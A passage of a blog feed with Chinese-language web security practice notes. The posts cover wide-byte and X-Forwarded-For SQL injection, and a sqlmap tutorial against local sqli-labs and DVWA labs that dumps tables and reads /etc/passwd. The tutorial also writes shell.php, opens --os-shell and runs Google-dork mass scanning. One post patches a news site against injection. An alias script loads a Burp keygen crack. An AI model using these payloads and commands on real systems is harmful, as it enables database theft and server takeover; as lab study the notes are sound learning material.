      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="宽字节注入" scheme="http://yoursite.com/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    
      <category term="IP 注入" scheme="http://yoursite.com/tags/IP-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>练习12</title>
    <link href="http://yoursite.com/2019/09/02/practice12/"/>
    <id>http://yoursite.com/2019/09/02/practice12/</id>
    <published>2019-09-02T11:34:32.000Z</published>
    <updated>2019-09-09T06:05:00.463Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 练习宽字节注入和请求头 <code>IP</code> 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>打开 <code>burpsuite</code> 抓取数据包</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver.png" alt></p><p>在 <code>username</code> 后面加上 <code>%df%27</code>，请求页面，发现没有变化，主要是因为 <code>POST</code> 传输不需要 <code>URL</code> 解码，点击 <code>Hex</code>，找到 <code>username</code> 的位置，把 <code>1</code> 后面的字符改成  <code>df</code> 和 <code>27</code> </p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver1.png" alt></p><p>返回查看数据，把多余的字符删除。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver2.png" alt></p><p>点击 <code>Go</code>，查看 <code>Response</code>，发现页面变化了，即找到了注入点。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver3.png" alt></p><p>尝试使用时间注入，修改 <code>Request</code> 如下，</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver4.png" alt></p><p>点击 <code>Go</code> 发现页面，没有延迟。很可能是 <code>.ova</code> 文件导入过来，数据库并没有数据造成的，在网页上注册一个用户，再次运行，可以发现响应延迟了 <code>1s</code> 左右。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver5.png" alt></p><p>删除多余的 <code>*</code>，再在我们想要注入的地方加入 <code>*</code>，右击保存文件。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver6.png" alt></p><p>接下来，使用 <code>sqlmap</code> 测试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r Desktop\wideType.txt <span class="comment"># wideType.txt 存放的是HTTP响应的数据</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver7.png" alt></p><p>可以发现漏洞，但是最新版的 <code>sqlmap</code> 在脱裤时，会出现问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">"C:\Users\han\Desktop\wideType.txt"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver8.png" alt></p><h3 id="请求头-IP-注入"><a href="#请求头-IP-注入" class="headerlink" title="请求头 IP 注入"></a>请求头 <code>IP</code> 注入</h3><p>数据库中更新用户 <code>IP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 更新 IP</span><br><span class="line">UPDATE  USER SET last_loginip=&apos;8.8.8.8&apos; WHERE `username`=&apos;zhang&apos;;</span><br></pre></td></tr></table></figure><p>想要注入，首先得进行前 <code>&#39;</code> 的闭合和注释掉后 <code>&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE USER SET last_loginip=&apos;8.8.8.8&apos; /*此处插入想要执行的语句*/ #&apos; WHERE `username`=&apos;zhang&apos;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE USER SET last_loginip=&apos;8.8.8.8&apos; and WHERE id=1 and sleep(5) #&apos; WHERE `username`=&apos;zhang&apos;;</span><br></pre></td></tr></table></figure><p>使用 <code>Modify Headers</code> 添加 <code>X-Forwarded-For</code> 设置为 <code>8.8.8.8&#39;</code>，先注册一个用户。用户名 <code>123</code>，密码 <code>123</code>。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP.png" alt></p><p>用 <code>burpsuite</code> 抓取数据包</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP1.png" alt></p><p>在 <code>X-Forwarded-For</code> 后面补充 <code>where 1=1 and sleep(5)</code>，点击 <code>Go</code></p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP2.png" alt></p><p>等待 <code>5s</code> 后，页面有响应。由此可找到注入点，把 <code>where id=1 and sleep(5)</code> 改成 <code>where id = 1 *</code> ，删除请求其他 <code>*</code> 号，保存到文件里。开始用 <code>sqlmap</code> 执行 <code>payload</code>。</p><p>把注入点修改为 <code>where 1=1 or sleep(5)</code> 页面没有延迟，原因是 <code>1=1 or sleep(5)</code> 短路原理，故 <code>sleep(5)</code> 压根就没有执行。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C189.png" alt></p><p>使用 <code>where 1=1 and sleep(5)</code> ，我们可以看出来延迟了将近 <code>15s</code>。关于 <code>1=1 or 条件</code> 和 <code>1=2 and 条件</code> 的短路原理，在前几篇文章写过，但真正在实战中确实还是容易忘掉。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C190.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">"C:\Users\han\Desktop\ip.txt"</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(custom) HEADER parameter <span class="string">'X-Forwarded-For #1*'</span> appears to be <span class="string">'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'</span> injectable</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP3.png" alt></p><p>可以使用 <code>--technique T</code> 指定时间注入，缩短时间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">"C:\Users\han\Desktop\ip.txt"</span> --technique T --dbs</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP4.png" alt></p><h3 id="问题与总结"><a href="#问题与总结" class="headerlink" title="问题与总结"></a>问题与总结</h3><p>关于 <code>SQLmap</code> 自定义注入点的思考：</p><ol><li>先通过 <code>burpsuite</code> 抓取数据包，尝试找到注入点。</li><li>找到注入点后，分析使用布尔盲注还是时间盲注，在 <code>burpsuite</code> 中的 <code>Repeater</code> 模块中通过在请求内容中增加 <code>SQL</code> 语句尝试。</li><li>在注入点中，把添加 <code>SQL</code> 语句中能够做修改的地方改写成 <code>*</code>。<ul><li>在<code>老司机</code>例子中，定位到  <code>username</code> 存在宽字节注入，后面写上 <code>or if((select 1 and 1=1), sleep(3), 1)</code> 发现响应延迟，那 <code>payload</code> 该放在那呢？首先能够确定的是，必然在 <code>select 1 and 1=1</code> 这句话里面，<code>if</code> 关键字第一个表达式必须是布尔型，所以直接在 <code>1=1</code> 加 <code>*</code> 号即可。</li><li>在 <code>留言板</code> 例子中，通过对 <code>SQL</code> 语句的猜想，可以知道要在 <code>X-Forwarded-For: 8.8.8.8&#39;</code> 后面加上 <code>where 1=1 and sleep(5) #</code> 在本例中，可以修改为 <code>where 1=1*</code> 即可。</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 练习宽字节注入和请求头 &lt;code&gt;IP&lt;/code&gt; 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="宽字节注入" scheme="http://yoursite.com/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    
      <category term="IP 注入" scheme="http://yoursite.com/tags/IP-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>练习11</title>
    <link href="http://yoursite.com/2019/08/31/practice11/"/>
    <id>http://yoursite.com/2019/08/31/practice11/</id>
    <published>2019-08-31T03:08:50.000Z</published>
    <updated>2019-09-09T05:33:20.260Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>SQLMap</code>的应用，使用<code>sqli-labs</code> 和 <code>dvwa</code> 作为实验平台。</p><a id="more"></a><!--export--><!--toc--><h3 id="用-SQLMap-查看数据库"><a href="#用-SQLMap-查看数据库" class="headerlink" title="用 SQLMap 查看数据库"></a>用 <code>SQLMap</code> 查看数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/images/156sql-dbs.png" alt></p><p>得出结果：</p><p><img src="/images/157sql-dbs-result.png" alt></p><h3 id="查看-security-库中的表"><a href="#查看-security-库中的表" class="headerlink" title="查看 security 库中的表"></a>查看 <code>security</code> 库中的表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> -D security --tables</span><br></pre></td></tr></table></figure><p>得出结果：</p><p><img src="/images/158sql-sec-tables.png" alt></p><h3 id="查看-users-表中所有的字段名"><a href="#查看-users-表中所有的字段名" class="headerlink" title="查看  users 表中所有的字段名"></a>查看  <code>users</code> 表中所有的字段名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> -D security -T  users --columns</span><br></pre></td></tr></table></figure><p>得出结果：</p><p><img src="/images/159sql-sec-users-columns.png" alt></p><h3 id="查看-security-users-表中的内容"><a href="#查看-security-users-表中的内容" class="headerlink" title="查看 security.users 表中的内容"></a>查看 <code>security.users</code> 表中的内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> -D security -T  users -C id,password,username --dump</span><br></pre></td></tr></table></figure><p>得出结果：</p><p><img src="/images/160dump.png" alt></p><h3 id="使用-method-和-POST-参数"><a href="#使用-method-和-POST-参数" class="headerlink" title="使用 method 和 POST 参数"></a>使用 <code>method</code> 和 <code>POST</code> 参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-11/"</span> --method=<span class="string">"post"</span> --data=<span class="string">"uname=admin&amp;passwd=admin"</span> --dbs</span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="/images/162method_data.png" alt></p><h3 id="使用-cookie"><a href="#使用-cookie" class="headerlink" title="使用 cookie"></a>使用 <code>cookie</code></h3><p>在 <code>/sqli-labs/Less-11</code> 中，由于只涉及登录功能，没有登录以后的操作，所以用 <code>--cookie</code> 无法抓取相应数据。 故使用 <code>dvwa</code> 测试。</p><p>登录账号，查看 <code>cookie</code> </p><p><img src="/images/165cookie.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low; PHPSESSID=ar14vrf1ie0kc399hgpmqc1fd2"</span> --dbs</span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="/images/166cookie1.png" alt></p><p><img src="/images/166cookie2.png" alt></p><p><img src="/images/166cookie3.png" alt></p><p><img src="/images/166cookie4.png" alt></p><h3 id="使用-user-agent"><a href="#使用-user-agent" class="headerlink" title="使用 user-agent"></a>使用 <code>user-agent</code></h3><p>打开 <code>/sqli-labs/Less-1</code> 中的 <code>index.php</code> ，添加如下程序。</p><p><img src="/images/167user_agent.png" alt></p><p>即当程序检测到 <code>user-agent</code> 值为 <code>bp</code> 时，直接退出程序。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-1/?id=1"</span> --user-agent=<span class="string">"bp"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/images/168bp.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-1/?id=1"</span> --user-agent=<span class="string">"sqlmap"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/images/169sqlSec.png" alt></p><p><img src="/images/170sqlSec.png" alt></p><p>把添加的语句删除，保存退出，重新用 <code>sqlmap</code> 尝试读取数据库信息</p><p><img src="/images/171sqlbpSec.png" alt></p><p><img src="/images/171sqlbpSec1.png" alt></p><p>爬取数据库成功，由此可见，命令行设置 <code>--user-agent</code>是起到一定作用， 有些网站通过对 <code>user-agent</code>参数的检测，达到对 <code>SQLMap</code> 的屏蔽。</p><p><strong>注意</strong>：每次完成后，记住对 <code>/sqlmap/output/</code> 文件夹下对应目录的清理。</p><p>另一种方法是设置代理用 <code>burpsuite</code> 抓包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-3/?id=1"</span> --user-agent=<span class="string">"burpsuite"</span> --proxy=<span class="string">"http://127.0.0.1:8080"</span></span><br></pre></td></tr></table></figure><p>打开 <code>burpsuite</code> 抓取 <code>sqlmap</code> 数据包</p><p><img src="/images/184proxy.png" alt></p><p><img src="/images/185proxy.png" alt></p><p>可以看到 <code>user-agent</code> 变为我们设置的值了。</p><h3 id="sqlmap-读文件"><a href="#sqlmap-读文件" class="headerlink" title="sqlmap 读文件"></a><code>sqlmap</code> 读文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-1/?id=1"</span> --file-read=<span class="string">"/var/www/html/sqli-labs/index.html"</span></span><br></pre></td></tr></table></figure><p><img src="/images/172sqlmap_read.png" alt></p><p><img src="/images/172sqlmap_read1.png" alt></p><p><img src="/images/172sqlmap_read2.png" alt></p><p>点击查看读取的文件</p><p><img src="/images/172sqlmap_read3.png" alt></p><p>打开文件</p><p><img src="/images/172sqlmap_read4.png" alt></p><h3 id="sqlmap-写文件"><a href="#sqlmap-写文件" class="headerlink" title="sqlmap 写文件"></a><code>sqlmap</code> 写文件</h3><p>在本地新建 <code>hack.php</code> 文件，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-1/?id=1"</span> --file-write=<span class="string">"hack.php"</span> --file-dest=<span class="string">"/var/myfile/hack.php"</span> -v 5</span><br></pre></td></tr></table></figure><p>在服务器中查看</p><p><img src="/images/173sqlmap_write.png" alt></p><h3 id="sqlmap-执行-sql语句"><a href="#sqlmap-执行-sql语句" class="headerlink" title="sqlmap 执行 sql语句"></a><code>sqlmap</code> 执行 <code>sql</code>语句</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low; PHPSESSID=ri8va1c84en9d40b7l1o1lle53"</span> --sql-shell</span><br></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select @@datadir;</span><br><span class="line">select user();</span><br></pre></td></tr></table></figure><p><img src="/images/173sqlmp_sqlcmd.png" alt></p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C173sqlmap_sqlcmd1.png" alt></p><h3 id="sqlmap-g"><a href="#sqlmap-g" class="headerlink" title="sqlmap -g"></a><code>sqlmap -g</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g <span class="string">"inurl:?id=1"</span></span><br></pre></td></tr></table></figure><p><img src="/images/174sqlmap_g.png" alt></p><h3 id="sqlmap-r"><a href="#sqlmap-r" class="headerlink" title="sqlmap -r"></a><code>sqlmap -r</code></h3><p>打开 <code>burpsuite</code> 抓包，</p><p><img src="/images/175sqlmap_r.png" alt></p><p>把 <code>Request</code> 里面的内容，复制粘贴到 <code>less12.txt</code> 中，打开 <code>sqlmap</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r less12.txt</span><br></pre></td></tr></table></figure><p><img src="/images/176sqlmap_r.png" alt></p><p><img src="/images/177sqlmap-r.png" alt></p><h3 id="sqlmap-os-shell"><a href="#sqlmap-os-shell" class="headerlink" title="sqlmap --os-shell"></a><code>sqlmap --os-shell</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-1/?id=1"</span> --os-shell</span><br></pre></td></tr></table></figure><p>用 <code>sqli-labs</code> 和 <code>dvwa</code> 都会提示</p><p><img src="/images/178error.png" alt></p><p>尝试了 <code>Window</code> 和 <code>CentOS</code> 系统，还是失败。在网上搜到参考文章，照着修改权限，依然没有成功。</p><p><em>参考文章</em></p><blockquote><p><a href="https://blog.csdn.net/lplp9822/article/details/84112979" target="_blank" rel="noopener">DVWA(linux下)利用sqlmap进行–os-shell注入不能成功的错误处理</a></p></blockquote><p>最后</p><p>在虚拟机中把，html 文件夹权限修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/</span><br><span class="line">chmod 777 html</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-3/?id=1"</span> --os-shell</span><br></pre></td></tr></table></figure><p><img src="/images/182os-shell.png" alt></p><p><img src="/images/183os-shel.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: &lt;code&gt;SQLMap&lt;/code&gt;的应用，使用&lt;code&gt;sqli-labs&lt;/code&gt; 和 &lt;code&gt;dvwa&lt;/code&gt; 作为实验平台。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="SQL盲注" scheme="http://yoursite.com/tags/SQL%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>news</title>
    <link href="http://yoursite.com/2019/08/31/news/"/>
    <id>http://yoursite.com/2019/08/31/news/</id>
    <published>2019-08-31T00:18:42.000Z</published>
    <updated>2019-09-01T14:33:21.480Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 修改新闻管理系统，防止 SQL 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a><code>login.php</code></h3><p>在登录界面，存在万能密码漏洞，用户名输入 <code>admin&#39; or 1</code> 点击提交按钮，可以登录。对输入的用户名进行函数处理，可以防止此类问题发生。</p><p><img src="/images/143loginSQL.png" alt> </p><h3 id="xinwenmoreandpinglun-php"><a href="#xinwenmoreandpinglun-php" class="headerlink" title="xinwenmoreandpinglun.php"></a><code>xinwenmoreandpinglun.php</code></h3><p>查看新闻及评论功能界面，在 URL 后输入 <code>&#39; --+</code> ，页面可以正常显示， 存在 SQL 注入。</p><p><img src="/images/144commentSQL.png" alt></p><p>对传入的 <code>action</code>  进行函数处理</p><p><img src="/images/155comment.png" alt></p><p>再次尝试 SQL 注入</p><p><img src="/images/145commentfail.png" alt></p><h3 id="zengjiaxinwen-php"><a href="#zengjiaxinwen-php" class="headerlink" title="zengjiaxinwen.php"></a><code>zengjiaxinwen.php</code></h3><p>在增加新闻界面，在标题中写入 <code>标题&#39; or sleep(1) -- |</code>，点击提交插入成功。</p><p><img src="/images/147addnewsSQL.png" alt></p><p>之后再新闻展示，新闻排序等功能时，都会出现延时现象。在这里做简单的防止注入措施。</p><p><img src="/images/148addnewsSQL.png" alt></p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a><code>index.php</code></h3><p>在 <code>index.php</code> 页面的搜索框，输入 <code>admin%&#39;#</code> 发现能正常搜索。</p><p><img src="/images/150searchSQL.png" alt></p><p>修改后再次输入 <code>admin%&#39; #</code>，搜索失败</p><p><img src="/images/151searchfail.png" alt></p><h3 id="个人信息和安全设置"><a href="#个人信息和安全设置" class="headerlink" title="个人信息和安全设置"></a><code>个人信息和安全设置</code></h3><h4 id="personal-information-php"><a href="#personal-information-php" class="headerlink" title="personal_information.php"></a><code>personal_information.php</code></h4><p>个人信息界面，邮箱存在时间盲注漏洞。</p><p><img src="/images/153emailSQL.png" alt></p><h4 id="anquanshezhi-php"><a href="#anquanshezhi-php" class="headerlink" title="anquanshezhi.php"></a><code>anquanshezhi.php</code></h4><p><img src="/images/154pass.png" alt></p><h3 id="问题与改进"><a href="#问题与改进" class="headerlink" title="问题与改进"></a>问题与改进</h3><ol><li>增加新闻界面，对标题和内容的处理不合理，当标题和内容输入的内容包含预定义字符时，页面显示的效果与预期不符。</li><li>存在潜在的 SQL 注入漏洞。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 修改新闻管理系统，防止 SQL 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="防止SQL注入" scheme="http://yoursite.com/tags/%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>笔记35</title>
    <link href="http://yoursite.com/2019/08/30/note35/"/>
    <id>http://yoursite.com/2019/08/30/note35/</id>
    <published>2019-08-30T13:06:45.000Z</published>
    <updated>2019-09-09T05:38:47.479Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: SQLMap 的简单应用</p><a id="more"></a><!--export--><!--toc--><h3 id="Window-中的-cmd-中设置别名"><a href="#Window-中的-cmd-中设置别名" class="headerlink" title="Window 中的 cmd 中设置别名"></a>Window 中的 cmd 中设置别名</h3><h4 id="设置-cmd-中常用命令的别名"><a href="#设置-cmd-中常用命令的别名" class="headerlink" title="设置 cmd 中常用命令的别名"></a>设置 cmd 中常用命令的别名</h4><ol><li>新建 .bat 文件， cmd 输入 regedit</li></ol><p><img src="/images/140cmd.png" alt></p><ol start="2"><li><p>在 \HKEY_CURRENT_USER\Software\Microsoft\ 中新建项，命名为 Command Processor，再在其中新建字符串值，命名为 AutoRun，数据写为 .bat 的路径。</p><p><img src="/images/141batpath.png" alt></p></li><li><p>按照如下格式编辑 .bat 文件</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">doskey sqlmap=D:\Software\Python27\python.exe D:\tools\PyScript\sqlmap\sqlmap.py $*</span><br><span class="line">doskey clear=cls</span><br><span class="line">doskey burp=java -Xbootclasspath/p:D:\Software\burpsuite\burp-loader-keygen.jar -jar D:\Software\burpsuite\burpsuite_pro_v2.0beta.jar</span><br><span class="line">doskey behinder=javaw -jar D:\tools\software\Behinder\Behinder.jar</span><br></pre></td></tr></table></figure><p><img src="/images/142batcontent.png" alt></p><p>然后就可以直接在 cmd 中启动软件了。</p><p>behinder 软件还是无法启动，目前没有找到解决方法。</p><p><em>参考文章</em></p><blockquote><p><a href="https://blog.csdn.net/yiranzhiliposui/article/details/83116819" target="_blank" rel="noopener">cmd中设置别名</a></p></blockquote><h3 id="SQLMap-的应用"><a href="#SQLMap-的应用" class="headerlink" title="SQLMap 的应用"></a>SQLMap 的应用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">--current-user                     #操作系统用户</span><br><span class="line">--current-db                       #当前库名</span><br><span class="line">--dbs                              #所有库名</span><br><span class="line">--users                            #数据库管理员</span><br><span class="line">--privileges -U                    #查管理员权限</span><br><span class="line">--roles                            #查数据库角色</span><br><span class="line">-D dvwa --tables                   #查库dvwa中所有的表</span><br><span class="line">-D dvwa -T users --columns         #查表users中所有的列</span><br><span class="line">--schema --batch --exclude-sysdbs  #查information_schema中表结构</span><br><span class="line">--batch                            #表示过程中都选择默认选项    </span><br><span class="line">--exclude-sysdbs                   #表示忽略系统表，只查有价值表</span><br><span class="line">--count                            #对表计数</span><br><span class="line"></span><br><span class="line">Dump 脱裤，慎用！</span><br><span class="line">--dump, -C, -T, -D, --start, --stop #(部分脱裤)</span><br><span class="line">--dump-all --exclude-sysdbs         #(直接脱裤)</span><br><span class="line">--sql-query &quot;select * from users&quot;   #(自己命令脱离库)</span><br><span class="line"># 当数据库管理员比较安全，没法顺利脱裤，只能利用字典拆解表名列名</span><br><span class="line">--common-tables     --common-columns</span><br></pre></td></tr></table></figure><p><strong>Note</strong>: Mysql &lt; 5.0，没有 information_schema 库，Mysql &gt;= 5.0，但无权读取 information_schema 库，微软的 access 数据库，默认无权读取 MSysObjects库。</p><h4 id="操作系统命令"><a href="#操作系统命令" class="headerlink" title="操作系统命令"></a>操作系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--file-read = &quot;/etc/passwd&quot;</span><br><span class="line">--file-write=&quot;shell.php&quot; --file-dest &quot;/tmp/shell.php&quot;</span><br><span class="line"></span><br><span class="line">--sql-shell    # Mysql</span><br><span class="line">--os-shell</span><br><span class="line">--os-cmd</span><br><span class="line"></span><br><span class="line">sqlmap -m list.txt  # 批量扫描</span><br><span class="line"># 调用google api 来扫描，国内需要设置代理链：</span><br><span class="line">sqlmap.py -g &quot;inurl:&quot;.php?id=1&quot;&quot; --proxy=&quot;http://127.0.0.1:8087&quot;</span><br><span class="line"></span><br><span class="line"># 利用proxy截断http请求并保存为 request.txt (推荐)</span><br><span class="line">sqlmap -r request.txt</span><br><span class="line"># 利用burpsite中的option设置，勾选保存proxy的request请求日志，保存为log.txt</span><br><span class="line">sqlmap -l log.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">--data# 数据段</span><br><span class="line"># web应用需要基于cookie身份认证</span><br><span class="line"># 检查cookie中注入点</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/index.php&quot; --data=&quot;user=1&amp;pass=2&quot;;</span><br><span class="line"></span><br><span class="line">--cookie# cookie字段</span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/index.php&quot; --cookie=&quot;user=1&amp;pass=2&quot;;</span><br><span class="line"></span><br><span class="line">--user-agent    # 手动指定</span><br><span class="line">--host# Host头</span><br><span class="line">--referer               # Referer头</span><br><span class="line">--method# 扫描时指定方法 POST/GET</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
